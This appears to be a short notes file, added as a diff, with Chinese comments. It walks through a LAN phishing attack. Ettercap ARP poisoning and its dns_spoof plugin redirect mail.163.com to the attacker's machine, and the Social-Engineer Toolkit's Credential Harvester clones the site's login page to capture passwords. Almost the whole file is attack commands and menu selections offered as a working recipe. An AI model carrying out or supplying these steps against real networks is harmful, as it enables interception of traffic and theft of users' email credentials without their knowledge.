@@ -1,0 +1,53 @@
+*ettercap -G 钓鱼网站*
+
+ifconfig
+# 攻击主机ip:192.168.1.105
+netstat -rn
+# 网关为192.168.1.1
+# 攻击目标主机ip：192.168.1.82
+vim /etc/ettercap/etter.dns
+# 编辑etter.dns文件
+# 将redirect下面添加需要设置钓鱼的网站
+mail.163.com  A   192.168.1.105
+mail.163.com  PTR 192.168.1.105
+# ：wq 保存修改
+ettercap -G
+# 打开ettercap，选择sniff-->eth0-->Hosts-->Scan for hosts-->Hosts list-->ARP Poisoning-->Sniff remote connetions-->Plugins-->Manage the plugins-->dns_spoof(双击）-->Start-->Start sniffing!!!
+setoolkit
+# 打开setoolkit工具箱
+1) Social-Engineering Attacks
+# 选择社会工程学攻击
+2) Website Attack Vectors
+# 选择网站攻击
+3) Credential Harvester Attack Method
+# 选择身份攻击
+2) Site Cloner
+# 选择网站克隆
+IP address for the POST back in Harvester/Tabnabbing [192.168.1.105]:192.168.1.105
+# 输入克隆后的ip地址
+Enter the url to clone:mail.163.com
+# 输入想要克隆的网站地址
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
